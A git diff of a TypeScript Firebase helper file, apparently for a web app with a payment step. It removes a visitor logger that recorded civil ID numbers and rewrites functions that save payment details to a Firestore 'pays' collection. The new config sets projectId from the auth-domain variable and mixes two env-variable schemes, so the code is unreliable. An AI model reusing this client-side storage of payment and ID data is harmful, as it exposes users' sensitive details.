@@ -1,87 +1,51 @@
-import {
-    collection,
-    addDoc,
-    serverTimestamp,
-    setDoc,
-    doc,
-    getFirestore,
-  } from "firebase/firestore";
-  import { initializeApp } from "firebase/app";
-  import { getDatabase } from "firebase/database";
- 
-   const firebaseConfig = {
-    apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
-    authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
-    projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
-    storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
-    messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
-    appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
-    measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID,
-  };
-  
-  const app = initializeApp(firebaseConfig);
-  export const db = getFirestore(app);
-  export const datatabas = getDatabase(app);
-  
-  interface VisitorData {
-    civilId: string;
-    timestamp: any;
-    userAgent: string;
-    violations?: any[];
+// firebase.js
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { doc, getFirestore, setDoc } from "firebase/firestore";
+import { env } from "process";
+
+const firebaseConfig = {
+  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
+  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
+  projectId:process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
+  storageBucket: env.VITE_FIREBASE_STORAGE_BUCKET,
+  messagingSenderId: env.VITE_FIREBASE_MESSAGING_SENDER_ID,
+  appId: env.VITE_FIREBASE_APP_ID,
+  measurementId: env.VITE_FIREBASE_MEASUREMENT_ID,
+};
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+export async function addData(data: any) {
+  localStorage.setItem("visitor", data.id);
+  try {
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(docRef, data, { merge: true });
+
+    console.log("Document written with ID: ", docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error("Error adding document: ", e);
+    // You might want to show an error message to the user here
   }
-  
-  export async function logVisitor(civilId: string): Promise<string> {
-    try {
-      const visitorRef = await addDoc(collection(db, "visitors"), {
-        civilId,
-        timestamp: serverTimestamp(),
-        userAgent: navigator.userAgent,
-      } as VisitorData);
-  
-      return visitorRef.id;
-    } catch (error) {
-      console.error("Error logging visitor:", error);
-      throw error;
-    }
-  }
-  
-  export async function addData(data: any) {
-    const country=localStorage.getItem('country')
-    localStorage.setItem("visitor", data.id);
-    try {
-      const docRef = await doc(db, "pays", data.id!);
+}
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...data, createdDate: new Date().toISOString() },
+        { ...paymentInfo, status: "pending" },
         { merge: true }
       );
-  
-      console.log("Document written with ID: ", docRef.id);
-      // You might want to show a success message to the user here
-    } catch (e) {
-      console.error("Error adding document: ", e);
-      // You might want to show an error message to the user here
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
+  } catch (error) {
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
-  export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
-    try {
-      const visitorId = localStorage.getItem("visitor");
-      if (visitorId) {
-        const docRef = doc(db, "pays", visitorId);
-        await setDoc(
-          docRef,
-          {
-            ...paymentInfo,
-            status: "pending",
-            createdDate: new Date().toISOString(),
-          },
-          { merge: true }
-        );
-        setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
-      }
-    } catch (error) {
-      console.error("Error adding document: ", error);
-      alert("Error adding payment info to Firestore");
-    }
-  };
-      
+};
+export { db, database };
